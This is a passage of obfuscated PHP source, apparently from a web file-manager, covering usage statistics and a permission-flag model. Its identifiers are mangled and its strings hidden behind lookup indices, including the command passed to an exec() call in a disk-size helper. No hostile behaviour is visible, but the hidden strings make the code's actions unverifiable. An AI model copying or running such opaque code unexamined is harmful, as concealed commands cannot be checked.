strtotime($¾Öê±‡È[$ñ¼ñëà[255]]); } if (!isset($ßà¡¤„µ)) { $µ™¿å«» = $ÕíÖÉñÁ == $ñ¼ñëà[671] ? $ñ¼ñëà[607] : $ñ¼ñëà[899]; $ßà¡¤„µ = Model($µ™¿å«»)->min($ñ¼ñëà[231]); } $èà°à’© = $ñ¼ñëà[1902] . ucfirst($ÕíÖÉñÁ); $ªÀœ÷«„ = $this->dateList($ßà¡¤„µ); foreach ($ªÀœ÷«„ as $ûùı­°) { $this->{$èà°à’©}($ûùı­°); } return $this->listData(); } private function dateList($‡Õ¢ƒÈš) { $ªìœÊËë =& $_SERVER[³Ôà×Ó]; $Ç•òƒ¼Ô = $‡Õ¢ƒÈš; $‡ÉîĞ³À = strtotime($ªìœÊËë[1901]); $äÇŠï = array(); while ($Ç•òƒ¼Ô <= $‡ÉîĞ³À) { $äÇŠï[] = date($ªìœÊËë[1900], $Ç•òƒ¼Ô); $Ç•òƒ¼Ô = strtotime($ªìœÊËë[1903], $Ç•òƒ¼Ô); } return $äÇŠï; } public function _recordUser($«ŞÛŞñÓ = '') { $ıÔ€æ¸é =& $_SERVER[³Ôà×Ó]; $‘ˆÕ˜Å² = strtotime(date($ıÔ€æ¸é[1904], strtotime($«ŞÛŞñÓ))); $º×õ‚Óå = strtotime(date($ıÔ€æ¸é[1905], strtotime($«ŞÛŞñÓ))); $×™±Ôê = array($ıÔ€æ¸é[231] => array($ıÔ€æ¸é[1088], $º×õ‚Óå)); $£ßõşã‡ = Model($ıÔ€æ¸é[607])->where($×™±Ôê)->count($ıÔ€æ¸é[1765]); $×™±Ôê[$ıÔ€æ¸é[231]] = array($ıÔ€æ¸é[409], array($‘ˆÕ˜Å², $º×õ‚Óå)); $«¼‚ ƒî = Model($ıÔ€æ¸é[607])->where($×™±Ôê)->count($ıÔ€æ¸é[1765]); $×™±Ôê[$ıÔ€æ¸é[33]] = $ıÔ€æ¸é[1906]; $–åéØØ° = Model($ıÔ€æ¸é[1907])->where($×™±Ôê)->count($ıÔ€æ¸é[1908]); $óõµ£ = array($ıÔ€æ¸é[255] => $«ŞÛŞñÓ, $ıÔ€æ¸é[840] => (int) $£ßõşã‡, $ıÔ€æ¸é[1893] => (int) $«¼‚ ƒî, $ıÔ€æ¸é[1894] => (int) $–åéØØ°); return $this->insert($óõµ£); } public function _recordStore($ÒŒ‚èºä = '') { $µ¨º°ÚÕ =& $_SERVER[³Ôà×Ó]; $ø’éÔÕ„ = strtotime(date($µ¨º°ÚÕ[1905], strtotime($ÒŒ‚èºä))); $İü“š‰Ç = array($µ¨º°ÚÕ[231] => array($µ¨º°ÚÕ[1088], $ø’éÔÕ„)); $ë€£å = Model($µ¨º°ÚÕ[553])->where($İü“š‰Ç)->sum($µ¨º°ÚÕ[79]); $İü“š‰Ç[$µ¨º°ÚÕ[494]] = 0; $î›ñßší = Model($µ¨º°ÚÕ[899])->where($İü“š‰Ç)->sum($µ¨º°ÚÕ[79]); $İü“š‰Ç[$µ¨º°ÚÕ[190]] = 1; $–ÎˆØìô = Model($µ¨º°ÚÕ[899])->where($İü“š‰Ç)->sum($µ¨º°ÚÕ[79]); $İü“š‰Ç[$µ¨º°ÚÕ[190]] = 2; $­‘ªÄŸ = Model($µ¨º°ÚÕ[899])->where($İü“š‰Ç)->sum($µ¨º°ÚÕ[79]); $µ¢¨™è = array($µ¨º°ÚÕ[255] => $ÒŒ‚èºä, $µ¨º°ÚÕ[838] => (int) $î›ñßší, $µ¨º°ÚÕ[1897] => (int) $ë€£å, $µ¨º°ÚÕ[1898] => (int) $–ÎˆØìô, $µ¨º°ÚÕ[1899] => (int) $­‘ªÄŸ); return $this->insert($µ¢¨™è); } public function trend($‡ÌşÉÙÍ, $Ğø—‡Î) { $Ô”ğÎ•Ó =& $_SERVER[³Ôà×Ó]; if (!$this->init($‡ÌşÉÙÍ)) { return !1; } $Öì™ÛŸ = $this->trendList($‡ÌşÉÙÍ); if ($Öì™ÛŸ && $Ğø—‡Î != $Ô”ğÎ•Ó[1738]) { $ È§¤ü¢ = $Öì™ÛŸ[0][$Ô”ğÎ•Ó[255]]; $ŠçŞ‚šÙ = $this->validDate($Ğø—‡Î, $ È§¤ü¢); $¹Ÿ·¡•— = array(); $Û°Ø«¤ = array_to_keyvalue($Öì™ÛŸ, $Ô”ğÎ•Ó[255]); foreach ($ŠçŞ‚šÙ as $é¯ğ×—§) { if (isset($Û°Ø«¤[$é¯ğ×—§])) { $üŞ»›¸ı = $Û°Ø«¤[$é¯ğ×—§]; } else { $üŞ»›¸ı = end($Öì™ÛŸ); $üŞ»›¸ı[$Ô”ğÎ•Ó[255]] = $é¯ğ×—§; if ($‡ÌşÉÙÍ == $Ô”ğÎ•Ó[671]) { $üŞ»›¸ı[$Ô”ğÎ•Ó[1893]] = $üŞ»›¸ı[$Ô”ğÎ•Ó[1894]] = 0; } } $¹Ÿ·¡•—[] = $üŞ»›¸ı; } $Öì™ÛŸ = $¹Ÿ·¡•—; } $÷’…üÙä = array($Ô”ğÎ•Ó[671] => array($Ô”ğÎ•Ó[840] => LNG($Ô”ğÎ•Ó[1909]), $Ô”ğÎ•Ó[1893] => LNG($Ô”ğÎ•Ó[1910]), $Ô”ğÎ•Ó[1894] => LNG($Ô”ğÎ•Ó[1911])), $Ô”ğÎ•Ó[1895] => array($Ô”ğÎ•Ó[838] => LNG($Ô”ğÎ•Ó[1912]), $Ô”ğÎ•Ó[1897] => LNG($Ô”ğÎ•Ó[1913]), $Ô”ğÎ•Ó[1898] => LNG($Ô”ğÎ•Ó[1914]), $Ô”ğÎ•Ó[1899] => LNG($Ô”ğÎ•Ó[1915]))); $°²à×šÇ = array($Ô”ğÎ•Ó[671] => $Ô”ğÎ•Ó[1916], $Ô”ğÎ•Ó[1895] => $Ô”ğÎ•Ó[79]); if (empty($Öì™ÛŸ)) { $é¯ğ×—§ = date($Ô”ğÎ•Ó[1900], strtotime($Ô”ğÎ•Ó[1901])); $®ªÆÓ©ì = array($Ô”ğÎ•Ó[255] => $é¯ğ×—§); foreach ($÷’…üÙä[$‡ÌşÉÙÍ] as $ìÙŸ…Ñá => $‚³ôÁÜ) { $®ªÆÓ©ì[$ìÙŸ…Ñá] = 0; } $Öì™ÛŸ[] = $®ªÆÓ©ì; } $Óš•®‹Ş = array(); foreach ($Öì™ÛŸ as $‚³ôÁÜ) { if ($‡ÌşÉÙÍ == $Ô”ğÎ•Ó[1895] && $‚³ôÁÜ[$Ô”ğÎ•Ó[1897]] > $‚³ôÁÜ[$Ô”ğÎ•Ó[838]]) { $‚³ôÁÜ[$Ô”ğÎ•Ó[1897]] = $‚³ôÁÜ[$Ô”ğÎ•Ó[838]]; } foreach ($÷’…üÙä[$‡ÌşÉÙÍ] as $ìÙŸ…Ñá => $ˆ®ƒë‹Ã) { $üŞ»›¸ı = array($Ô”ğÎ•Ó[255] => $‚³ôÁÜ[$Ô”ğÎ•Ó[255]], $Ô”ğÎ•Ó[1654] => $ˆ®ƒë‹Ã); $üŞ»›¸ı[$°²à×šÇ[$‡ÌşÉÙÍ]] = isset($‚³ôÁÜ[$ìÙŸ…Ñá]) ? $‚³ôÁÜ[$ìÙŸ…Ñá] : 0; $Óš•®‹Ş[] = $üŞ»›¸ı; } } return $Óš•®‹Ş; } public function validDate($Â†ğ¾¥¯, $ù©‰õŞ–) { $Ù¶Õº®ì =& $_SERVER[³Ôà×Ó]; $®…Š÷Í³ = date($Ù¶Õº®ì[1900], strtotime($Ù¶Õº®ì[1901])); $¤ØÈóëæ = array($®…Š÷Í³); switch ($Â†ğ¾¥¯) { case $Ù¶Õº®ì[1745]: $¤ÊÀ³à§ = mktime(0, 0, 0, date($Ù¶Õº®ì[1917]), date($Ù¶Õº®ì[1446]) - date($Ù¶Õº®ì[1536]) + 7 - 7, date($Ù¶Õº®ì[1918])); $¿¿ŸÖº· = 0; do { $üÓïæÑÒ = date($Ù¶Õº®ì[1900], $¤ÊÀ³à§ - 3600 * 24 * 7 * $¿¿ŸÖº·); $¤ØÈóëæ[] = $üÓïæÑÒ; $¿¿ŸÖº·++; } while ($ù©‰õŞ– < $üÓïæÑÒ); break; case $Ù¶Õº®ì[1743]: $¿¿ŸÖº· = 1; do { $¦Æ½­Ç¥ = date($Ù¶Õº®ì[1919], strtotime("\x2d\40{$¿¿ŸÖº·}\x20\155\157\156\x74\150\x73")); $¤ØÈóëæ[] = $¦Æ½­Ç¥; $¿¿ŸÖº·++; } while ($ù©‰õŞ– < $¦Æ½­Ç¥); break; case $Ù¶Õº®ì[1920]: $Øğ§çêÓ = (int) date($Ù¶Õº®ì[1918], strtotime($ù©‰õŞ–)); $Ü§®ş°Ç = (int) date($Ù¶Õº®ì[1918]); if ($Øğ§çêÓ >= $Ü§®ş°Ç) { break; } for ($Øğ§çêÓ; $Øğ§çêÓ < $Ü§®ş°Ç; $Øğ§çêÓ++) { $¤ØÈóëæ[] = $Øğ§çêÓ . $Ù¶Õº®ì[1921]; } break; default: break; } if ($ù©‰õŞ– > end($¤ØÈóëæ)) { array_pop($¤ØÈóëæ); } sort($¤ØÈóëæ); return $¤ØÈóëæ; } public function listTable($‚—‹‰ë¦) { $ÕŒüâ¦Ò = ucfirst($‚—‹‰ë¦); return Model($ÕŒüâ¦Ò)->listData(); } public function option($Á—âÍœ) { $»ŞÊÛåÆ = $_SERVER[³Ôà×Ó][1922] . ucfirst($Á—âÍœ); return $this->{$»ŞÊÛåÆ}(); } private function optionUser() { $œ†Ô¨Õ =& $_SERVER[³Ôà×Ó]; $ÕñŞ‹ä = Model($œ†Ô¨Õ[607])->count($œ†Ô¨Õ[1765]); $²®ßÄ™¬ = Model($œ†Ô¨Õ[607])->where($œ†Ô¨Õ[1923])->count($œ†Ô¨Õ[1765]); $Ğ¿à–Ì… = intval($GLOBALS[$œ†Ô¨Õ[6]][$œ†Ô¨Õ[425]][$œ†Ô¨Õ[1711]]) / 3600; $¯›‹î¤¥ = strtotime("\x2d{$Ğ¿à–Ì…}\40\x68\157\x75\162\x73"); $Â¾ËÜØÊ = strtotime(date($œ†Ô¨Õ[1904])); if ($¯›‹î¤¥ < $Â¾ËÜØÊ) { $¯›‹î¤¥ = $Â¾ËÜØÊ; } $œ…Ù¼Ÿ = array($œ†Ô¨Õ[1924] => array($œ†Ô¨Õ[1089], $¯›‹î¤¥)); $‚÷÷‘ô÷ = (int) Model($œ†Ô¨Õ[607])->where($œ…Ù¼Ÿ)->count($œ†Ô¨Õ[1765]); if (!$‚÷÷‘ô÷) { $‚÷÷‘ô÷ = 1; } $œ…Ù¼Ÿ = array($œ†Ô¨Õ[1924] => array($œ†Ô¨Õ[1089], $Â¾ËÜØÊ)); $ñÉ¦ƒƒ‚ = Model($œ†Ô¨Õ[607])->where($œ…Ù¼Ÿ)->count($œ†Ô¨Õ[1765]); return array($œ†Ô¨Õ[833] => (int) $ÕñŞ‹ä, $œ†Ô¨Õ[1925] => (int) ($ÕñŞ‹ä - $²®ßÄ™¬), $œ†Ô¨Õ[1926] => (int) $²®ßÄ™¬, $œ†Ô¨Õ[1927] => (int) $ñÉ¦ƒƒ‚, $œ†Ô¨Õ[1928] => $‚÷÷‘ô÷); } private function optionFile() { $ã¬ßß… =& $_SERVER[³Ôà×Ó]; $áúíıçÓ = $this->sourceSize(); $ë„Š¼“¾ = $áúíıçÓ[$ã¬ßß…[79]]; $í÷Å‚² = $áúíıçÓ[$ã¬ßß…[1897]]; $ŠİãÖ—í = Model($ã¬ßß…[899])->where(array($ã¬ßß…[494] => 0))->count($ã¬ßß…[193]); $ĞóôšÍ­ = array($ã¬ßß…[494] => 0, $ã¬ßß…[231] => array($ã¬ßß…[1089], strtotime(date($ã¬ßß…[1904])))); $¨‘Õ›Ó = Model($ã¬ßß…[899])->where($ĞóôšÍ­)->sum($ã¬ßß…[79]); $™Ê××éæ = Model($ã¬ßß…[899])->where($ĞóôšÍ­)->count($ã¬ßß…[193]); return array($ã¬ßß…[838] => $ë„Š¼“¾, $ã¬ßß…[1897] => $í÷Å‚², $ã¬ßß…[1929] => $ë„Š¼“¾ - $í÷Å‚², $ã¬ßß…[1930] => (int) $¨‘Õ›Ó, $ã¬ßß…[840] => (int) $ŠİãÖ—í, $ã¬ßß…[1931] => (int) $™Ê××éæ); } private function optionAccess() { $ì©¬ëÜ¨ =& $_SERVER[³Ôà×Ó]; return array($ì©¬ëÜ¨[833] => $this->typeLogCnt(), $ì©¬ëÜ¨[110] => $this->typeLogCnt($ì©¬ëÜ¨[110]), $ì©¬ëÜ¨[534] => $this->typeLogCnt($ì©¬ëÜ¨[534]), $ì©¬ëÜ¨[1932] => $this->typeLogCnt($ì©¬ëÜ¨[1932]), $ì©¬ëÜ¨[1933] => $this->typeLogCnt($ì©¬ëÜ¨[1933]), $ì©¬ëÜ¨[671] => $this->typeLogCnt($ì©¬ëÜ¨[12], $ì©¬ëÜ¨[1908])); } private function typeLogCnt($øÂÅ¶ğ¸ = '', $‚½¥Ñ†ç = "\151\144") { $õÈãÂ­ =& $_SERVER[³Ôà×Ó]; $—ëò°§ = array($õÈãÂ­[110] => array($õÈãÂ­[1934], $õÈãÂ­[1935]), $õÈãÂ­[534] => array($õÈãÂ­[1936], $õÈãÂ­[1937]), $õÈãÂ­[1932] => array($õÈãÂ­[1938], $õÈãÂ­[1939], $õÈãÂ­[1940]), $õÈãÂ­[1933] => array($õÈãÂ­[1941], $õÈãÂ­[1942]), $õÈãÂ­[1943] => array($õÈãÂ­[1944], $õÈãÂ­[1945], $õÈãÂ­[1946])); $“€œáŒ = strtotime(date($õÈãÂ­[1904])); $åÂ¹Áù† = array($õÈãÂ­[231] => array($õÈãÂ­[1089], $“€œáŒ)); if ($øÂÅ¶ğ¸) { $åÂ¹Áù†[$õÈãÂ­[33]] = array($õÈãÂ­[7], $—ëò°§[$øÂÅ¶ğ¸]); } $—šıœÏô = Model($õÈãÂ­[1907])->where($åÂ¹Áù†)->count($‚½¥Ñ†ç); return (int) $—šıœÏô; } private function optionServer() { $¿˜Ø¼ô =& $_SERVER[³Ôà×Ó]; $«ï¯ÁÄõ = $this->diskDriver(); $š¼ÛÕò = KodIO::defaultDriver(); $âì½×Ë = array($¿˜Ø¼ô[892] => $š¼ÛÕò[$¿˜Ø¼ô[484]]); $ÚçÑÜè = Model($¿˜Ø¼ô[553])->where($âì½×Ë)->sum($¿˜Ø¼ô[79]); $ß—±œ÷ = explode($¿˜Ø¼ô[53], $_SERVER[$¿˜Ø¼ô[147]]); $ÖÉßœæ» = $ß—±œ÷[0]; $­ºîü”¾ = $GLOBALS[$¿˜Ø¼ô[6]][$¿˜Ø¼ô[21]]; $÷–ÀşşÅ = $­ºîü”¾[$¿˜Ø¼ô[1051]]; if ($÷–ÀşşÅ == $¿˜Ø¼ô[1039]) { $³™’µâĞ = explode($¿˜Ø¼ô[1365], $­ºîü”¾[$¿˜Ø¼ô[1050]]); $÷–ÀşşÅ = $³™’µâĞ[0]; } if ($÷–ÀşşÅ == $¿˜Ø¼ô[987] || $÷–ÀşşÅ == $¿˜Ø¼ô[879]) { $¿ˆ‚‹ãõ = Model()->db()->query($¿˜Ø¼ô[1947]); $ØØ§ôûå = $¿ˆ‚‹ãõ[0] && isset($¿ˆ‚‹ãõ[0][$¿˜Ø¼ô[1653]]) ? $¿ˆ‚‹ãõ[0][$¿˜Ø¼ô[1653]] : 0; $÷–ÀşşÅ = $¿˜Ø¼ô[1948] . ($ØØ§ôûå ? $¿˜Ø¼ô[8] . $ØØ§ôûå : $¿˜Ø¼ô[12]); } $“öŞ›½£ = $GLOBALS[$¿˜Ø¼ô[6]][$¿˜Ø¼ô[425]][$¿˜Ø¼ô[901]]; return array($¿˜Ø¼ô[1949] => $«ï¯ÁÄõ ? $«ï¯ÁÄõ[$¿˜Ø¼ô[1950]] : 0, $¿˜Ø¼ô[1951] => $«ï¯ÁÄõ ? $«ï¯ÁÄõ[$¿˜Ø¼ô[1952]] : 0, $¿˜Ø¼ô[1953] => (int) $š¼ÛÕò[$¿˜Ø¼ô[1950]] * 1024 * 1024 * 1024, $¿˜Ø¼ô[1954] => (int) $ÚçÑÜè, $¿˜Ø¼ô[1955] => ucfirst($ÖÉßœæ»), $¿˜Ø¼ô[1956] => $¿˜Ø¼ô[1957] . PHP_VERSION, $¿˜Ø¼ô[1958] => phpBuild64() ? 64 : 32, $¿˜Ø¼ô[832] => str_replace($¿˜Ø¼ô[1208], $¿˜Ø¼ô[1067], $÷–ÀşşÅ), $¿˜Ø¼ô[425] => ucfirst($“öŞ›½£), $¿˜Ø¼ô[32] => $_SERVER[$¿˜Ø¼ô[1959]]); } private function diskDriver() { $€¡ÜÍÉü =& $_SERVER[³Ôà×Ó]; $õøÁìÍ¿ = $€¡ÜÍÉü[8]; $²Á­Ê§´ = $GLOBALS[$€¡ÜÍÉü[6]][$€¡ÜÍÉü[1382]] == $€¡ÜÍÉü[1383]; if ($²Á­Ê§´) { $õøÁìÍ¿ = $€¡ÜÍÉü[1960]; if (function_exists($€¡ÜÍÉü[1961])) { exec($€¡ÜÍÉü[1962], $¿—áëáÈ); $õøÁìÍ¿ = $¿—áëáÈ[1] . $€¡ÜÍÉü[8]; } } if (!file_exists($õøÁìÍ¿)) { return; } $ÔøÅøÂ = @disk_total_space($õøÁìÍ¿); $¨†ê»‚ë = $ÔøÅøÂ - @disk_free_space($õøÁìÍ¿); return array($€¡ÜÍÉü[1950] => $ÔøÅøÂ, $€¡ÜÍÉü[1952] => $¨†ê»‚ë); } public function fileChart($ô¤ÒäŞ) { $·š¿ßä½ =& $_SERVER[³Ôà×Ó]; if (isset($ô¤ÒäŞ[$·š¿ßä½[1765]])) { return Model($·š¿ßä½[899])->userFileTypeProfile($ô¤ÒäŞ[$·š¿ßä½[1765]]); } if (isset($ô¤ÒäŞ[$·š¿ßä½[1963]])) { return Model($·š¿ßä½[899])->groupFileTypeProfile($ô¤ÒäŞ[$·š¿ßä½[1963]]); } $š»ª¹¯õ = $this->sourceSize(); $íÇäÇ¥ = array($·š¿ßä½[192] => 0, $·š¿ßä½[190] => 1); $³ŸĞÀß = Model($·š¿ßä½[899])->where($íÇäÇ¥)->sum($·š¿ßä½[79]); $íÇäÇ¥[$·š¿ßä½[190]] = 2; $ÊÁ€¬ê« = Model($·š¿ßä½[899])->where($íÇäÇ¥)->sum($·š¿ßä½[79]); return array($·š¿ßä½[838] => $š»ª¹¯õ[$·š¿ßä½[79]], $·š¿ßä½[1897] => $š»ª¹¯õ[$·š¿ßä½[1897]], $·š¿ßä½[1898] => (int) $³ŸĞÀß, $·š¿ßä½[1899] => (int) $ÊÁ€¬ê«); } private function sourceSize() { $Îß€Âˆ¸ =& $_SERVER[³Ôà×Ó]; $èÍï˜³§ = Model($Îß€Âˆ¸[899])->where(array($Îß€Âˆ¸[494] => 0))->sum($Îß€Âˆ¸[79]); $È„¨Ë· = Model($Îß€Âˆ¸[553])->sum($Îß€Âˆ¸[79]); if ($È„¨Ë· > $èÍï˜³§) { $È„¨Ë· = $èÍï˜³§; } return array($Îß€Âˆ¸[79] => (int) $èÍï˜³§, $Îß€Âˆ¸[1897] => (int) $È„¨Ë·); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $¥œÒˆ’ =& $_SERVER[³Ôà×Ó]; $ÆÍİ«Ò¢ = array(array($¥œÒˆ’[503] => LNG($¥œÒˆ’[1964]), $¥œÒˆ’[1965] => $¥œÒˆ’[1966], $¥œÒˆ’[1967] => 1, $¥œÒˆ’[1968] => 1, $¥œÒˆ’[1969] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($¥œÒˆ’[503] => LNG($¥œÒˆ’[1970]), $¥œÒˆ’[1965] => $¥œÒˆ’[1971], $¥œÒˆ’[1967] => 2, $¥œÒˆ’[1968] => 1, $¥œÒˆ’[1969] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($¥œÒˆ’[503] => LNG($¥œÒˆ’[1972]), $¥œÒˆ’[1965] => $¥œÒˆ’[1973], $¥œÒˆ’[1967] => 3, $¥œÒˆ’[1968] => 1, $¥œÒˆ’[1969] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($¥œÒˆ’[503] => LNG($¥œÒˆ’[1974]), $¥œÒˆ’[1965] => $¥œÒˆ’[1975], $¥œÒˆ’[1967] => 4, $¥œÒˆ’[1968] => 1, $¥œÒˆ’[1969] => self::AUTH_SHOW | self::AUTH_VIEW), array($¥œÒˆ’[503] => LNG($¥œÒˆ’[1976]), $¥œÒˆ’[1965] => $¥œÒˆ’[1977], $¥œÒˆ’[1967] => 5, $¥œÒˆ’[1968] => 1, $¥œÒˆ’[1969] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($¥œÒˆ’[503] => LNG($¥œÒˆ’[1978]), $¥œÒˆ’[1965] => $¥œÒˆ’[1979], $¥œÒˆ’[1967] => 6, $¥œÒˆ’[1968] => 1, $¥œÒˆ’[1969] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($¥œÒˆ’[503] => LNG($¥œÒˆ’[1980]), $¥œÒˆ’[1965] => $¥œÒˆ’[1981], $¥œÒˆ’[1967] => 7, $¥œÒˆ’[1968] => 1, $¥œÒˆ’[1969] => 0)); return $ÆÍİ«Ò¢; } public static function authCheck($œ­é†éê, $÷ô„´œ) { $Ñ‘Œ¤Œ× =& $_SERVER[³Ôà×Ó]; $œ­é†éê = intval($œ­é†éê); if (KodUser::isRoot() && $GLOBALS[$Ñ‘Œ¤Œ×[6]][$Ñ‘Œ¤Œ×[1982]]) { return !0; } if ($œ­é†éê <= 0) { return !1; } if (($œ­é†éê & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($œ­é†éê & $÷ô„´œ); } public static function authCheckShow($—ç‘º¯ë) { return self::authCheck($—ç‘º¯ë, self::AUTH_SHOW); } public static function authCheckView($Á€”Û‘) { return self::authCheck($Á€”Û‘, self::AUTH_VIEW); } public static function authCheckDownload($æş©Õ«) { return self::authCheck($æş©Õ«, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ç’üØ’ñ) { return self::authCheck($ç’üØ’ñ, self::AUTH_UPLOAD); } public static function authCheckEdit($ŒóòöÅõ) { return self::authCheck($ŒóòöÅõ, self::AUTH_EDIT); } public static function authCheckRemove($ö’‘•Æ) { return self::authCheck($ö’‘•Æ, self::AUTH_REMOVE); } public static function authCheckShare($‡€´÷«¸) { return self::authCheck($‡€´÷«¸, self::AUTH_SHARE); } public static function authCheckComment($×‡Ìæ¬) { return self::authCheck($×‡Ìæ¬, self::AUTH_COMMENT); } public static function authCheckEvent($àŸÖÂ”’) { return self::authCheck($àŸÖÂ”’, self::AUTH_EVENT); } public static function authCheckRoot($Êë µŒÅ) { return self::authCheck($Êë µŒÅ, self::AUTH_ROOT); } public static function authCheckAction($´ı¯¢‚©, $Êì ÄÖô) { $€«Ğæ‡ =& $_SERVER[³Ôà×Ó]; $õûÜ³ëÛ = array($€«Ğæ‡[1983] => self::AUTH_VIEW, $€«Ğæ‡[1276] => self::AUTH_DOWNLOAD, $€«Ğæ‡[110] => self::AUTH_UPLOAD, $€«Ğæ‡[1933] => self::AUTH_EDIT, $€«Ğæ‡[1932] => self::AUTH_REMOVE, $€«Ğæ‡[1943] => self::AUTH_SHARE, $€«Ğæ‡[430] => self::AUTH_COMMENT, $€«Ğæ‡[1753] => self::AUTH_EVENT, $€«Ğæ‡[1984] => self::AUTH_ROOT); if (!isset($õûÜ³ëÛ[$Êì ÄÖô])) { return; } $‰úŒ = $õûÜ³ëÛ[$Êì ÄÖô]; $´ı¯¢‚© = intval($´ı¯¢‚©); if ($´ı¯¢‚© <= 0) { return !1; } if (($´ı¯¢‚© & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($´ı¯¢‚© & $‰úŒ); } public static function authDisable($ìÇ¯ß´, $¯™˜°©Õ) { if (intval($ìÇ¯ß´) <= 0) { return 0; } return intval($ìÇ¯ß´) & ~$¯™˜°©Õ; } public $optionType = "\123\171\x73\164\145\x6d\56\x73\x6f\x75\162\143\x65\101\165\x74\150\x4c\151\x73\164"; public $field = array("\x6e\x61\x6d\145", "\141\165\164\x68", "\x6c\141\x62\145\154", "\x64\x69\163\160\x6c\x61\x79", "\163\171\163\164\145\155", "\x73\157\162\164"); public function initData() { $ÅÜçÚ˜Æ = $this->authDefault(); foreach ($ÅÜçÚ˜Æ as $½¿¸ñÒ) { $this->add($½¿¸ñÒ); } } public function findAuth($ñÒ®‰ƒˆ, $ĞÔ˜†Ûà) { $ƒÏ´‰‰Ò =& $_SERVER[³Ôà×Ó]; $Ûõƒ×¤¢ = parent::listData(); foreach ($Ûõƒ×¤¢ as $”Ù„¦ñ¸) { $éƒËÊæ = intval($”Ù„¦ñ¸[$ƒÏ´‰‰Ò[496]]); if ($éƒËÊæ <= 0 || $”Ù„¦ñ¸[$ƒÏ´‰‰Ò[1985]] == 0) { continue; } if (($éƒËÊæ & $ñÒ®‰ƒˆ) != $ñÒ®‰ƒˆ) { continue; } if (($éƒËÊæ & $ĞÔ˜†Ûà) != 0) { continue; } return $”Ù„¦ñ¸[$ƒÏ´‰‰Ò[484]]; } return !1; } public function findAuthReadOnly() { $áİ°“ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $„—Ä¼’ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($áİ°“, $„—Ä¼’); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $³¹ƒ¨ğ =& $_SERVER[³Ôà×Ó]; $¶Ç¶¥ Ç = parent::listData(); $Ê•Ô´†Ê = !1; foreach ($¶Ç¶¥ Ç as $ÜÊ”‹ç¨) { if ($ÜÊ”‹ç¨[$³¹ƒ¨ğ[496]] <= 0 || $ÜÊ”‹ç¨[$³¹ƒ¨ğ[1985]] == $³¹ƒ¨ğ[228]) { continue; } if (!$Ê•Ô´†Ê) { $Ê•Ô´†Ê = $ÜÊ”‹ç¨; continue; } if ($Ê•Ô´†Ê[$³¹ƒ¨ğ[496]] > $ÜÊ”‹ç¨[$³¹ƒ¨ğ[496]]) { $Ê•Ô´†Ê = $ÜÊ”‹ç¨; } } return $Ê•Ô´†Ê ? $Ê•Ô´†Ê[$³¹ƒ¨ğ[484]] : $³¹ƒ¨ğ[12]; } public function listData($˜Ÿ—äë = false, $²ÖØ­÷ş = "\163\x6f\162\164", $¡•è€µ¬ = false) { return parent::listData($˜Ÿ—äë, $²ÖØ­÷ş, $¡•è€µ¬); } public function update($€Ö ã›, $â•µ°½¡) { $ú¿‡Êå™ =& $_SERVER[³Ôà×Ó]; $’ğ§®øÁ = parent::listData($€Ö ã›); $ûŞşİ¾÷ = $this->findByName($â•µ°½¡[$ú¿‡Êå™[32]]); if (!$’ğ§®øÁ || $ûŞşİ¾÷ && $ûŞşİ¾÷[$ú¿‡Êå™[484]] != $’ğ§®øÁ[$ú¿‡Êå™[484]]) { return !1; } $this->filterAuth($â•µ°½¡[$ú¿‡Êå™[496]]); return parent::update($€Ö ã›, $â•µ°½¡); } public function remove($Òù¹ò©´) { $³ßÎõÁÑ = parent::listData($Òù¹ò©´); if (!$³ßÎõÁÑ || $³ßÎõÁÑ[$_SERVER[³Ôà×Ó][191]]) { return !1; } return parent::remove($Òù¹ò©´); } public function add($»§İÉÁ = array()) { $›”øÒ’† =& $_SERVER[³Ôà×Ó]; if ($this->findByName($»§İÉÁ[$›”øÒ’†[32]])) { return !1; } $Â´‡»û— = array($›”øÒ’†[32] => $›”øÒ’†[12], $›”øÒ’†[496] => 1, $›”øÒ’†[1986] => $›”øÒ’†[1973], $›”øÒ’†[1985] => 1, $›”øÒ’†[191] => 0, $›”øÒ’†[1987] => 0); $»§İÉÁ = array_merge($Â´‡»û—, $»§İÉÁ); $»§İÉÁ[$›”øÒ’†[1987]] = $this->getSort(); $this->filterAuth($»§İÉÁ[$›”øÒ’†[496]]); return parent::insert($»§İÉÁ); } private function getSort() { $Ä£–âŒ =& $_SERVER[³Ôà×Ó]; $êã¹Î½Å = parent::listData(); $ ÖèåÎ¤ = array_to_keyvalue($êã¹Î½Å, $Ä£–âŒ[12], $Ä£–âŒ[1987]); return empty($ ÖèåÎ¤) ? 0 : max($ ÖèåÎ¤) + 1; } private function filterAuth(&$©Õ³Ê·) { if (!$©Õ³Ê·) { return; } $Œ²Åó = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, 